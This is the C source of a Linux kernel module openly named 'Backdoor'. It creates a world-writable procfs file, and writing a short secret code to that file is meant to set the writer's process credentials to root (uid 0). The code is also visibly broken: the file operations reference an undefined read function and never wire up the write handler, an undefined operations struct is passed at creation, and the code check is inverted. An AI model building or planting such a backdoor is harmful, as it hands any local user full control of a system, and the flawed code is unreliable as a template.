#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/cdev.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("MaxVorosh");
MODULE_DESCRIPTION("Backdoor");
MODULE_VERSION("0.1");

#define DEVICE_NAME "backdoor"
#define SECRET_CODE "32"
#define SECRET_CODE_LENGTH 2

static struct proc_dir_entry *proc_entry;

static long unsafe_setuid(uid_t uid) {
	struct user_namespace *ns = current_user_ns();
	const struct cred *old;
	struct cred *new;
	int retval = 0;
	kuid_t kuid;

	kuid = make_kuid(ns, uid);
	if (!uid_valid(kuid))
		return -EINVAL;

	new = prepare_creds();
	if (!new)
		return -ENOMEM;
	old = current_cred();

	new->suid = new->uid = kuid;
	if (!uid_eq(kuid, old->uid)) {
		retval = set_user(new);
		if (retval < 0)
			goto error;
	}

	new->fsuid = new->euid = kuid;

	retval = security_task_fix_setuid(new, old, LSM_SETID_ID);
	if (retval < 0)
		goto error;

	retval = set_cred_ucounts(new);
	if (retval < 0)
		goto error;

	flag_nproc_exceeded(new);
	return commit_creds(new);

error:
	abort_creds(new);
	return retval;
}

static ssize_t backdoor_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
{
	if (len != SECRET_CODE_LENGTH) {
		pr_info("backdoor: Not a secret code given, wrong length");
		return len;
	}
	const char* data[SECRET_CODE_LENGTH];
	int result = copy_from_user(data, buf, SECRET_CODE_LENGTH);
	if (result != 0) {
		pr_info("backdoor: Copy from user error");
		return -EFAULT;
	}
	if (!strcmp(SECRET_CODE, data)) {
		pr_info("backdoor: Not a secret code given, wrong code");
		return len;
	}
	int retval = unsafe_setuid(0);
	if (retval != 0) {
		pr_info("backdoor: Error in setuid: %d", retval);
		return retval;
	}
	return len;
}

static const struct file_operations backdoor_fops = {
    .owner = THIS_MODULE,
    .read = my_proc_read,
};

static int __init backdoor_init(void)
{
	proc_entry = proc_create(DEVICE_NAME, 0666, NULL, &proc_fops);
    if (!proc_entry) {
        pr_error("backdoor: Cannot create procfs file");
        return -ENOMEM;
    }
    
    pr_info("backdoor: Module inited");
    return 0;
}

static void __exit backdoor_exit(void)
{
	remove_proc_entry(DEVICE_NAME, NULL);

	pr_info("backdoor: module unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);

